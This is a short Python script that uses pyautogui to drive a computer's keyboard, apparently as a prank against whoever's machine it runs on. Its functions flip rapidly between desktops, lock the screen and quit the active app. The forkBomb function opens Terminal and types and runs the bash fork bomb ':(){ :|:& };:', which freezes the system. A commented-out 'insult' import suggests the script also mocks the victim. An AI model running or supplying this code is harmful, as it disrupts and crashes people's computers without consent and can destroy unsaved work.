import pyautogui as gui
import time
# from insult_ai import insult

def desktops():
    gui.keyDown("ctrl")
    for i in range(5):
        gui.press("left")
        time.sleep(0.05)
        gui.press("left")
        time.sleep(0.4)
        gui.press("right")
        time.sleep(0.05)
        gui.press("left")
        time.sleep(0.05)
        gui.press("right")
        time.sleep(0.05)
        gui.press("left")
        time.sleep(0.05)
        gui.press("right")
        time.sleep(0.05)
        gui.press("right")
        time.sleep(0.05)
        gui.press("left")
        time.sleep(0.05)
        gui.press("left")
        time.sleep(0.05)
        gui.press("right")
    gui.keyUp("ctrl")

def lockScreen():
    gui.keyDown("command")
    gui.keyDown("ctrl")
    time.sleep(0.05)
    gui.press("q")
    time.sleep(5)
    gui.keyUp("command")
    gui.keyUp("ctrl")

def quitApp():
    gui.keyDown("command")
    gui.press("q")
    gui.keyUp("command")

def forkBomb():
    gui.keyDown("command")
    gui.press("space")
    gui.keyUp("command")
    time.sleep(0.5)
    gui.write("terminal", interval=0.1)
    gui.press("enter")
    time.sleep(1)
    gui.write(":(){ :|:& };:", interval=0.25)
    time.sleep(0.5)
    gui.press("enter")
    # insult("slow comp")

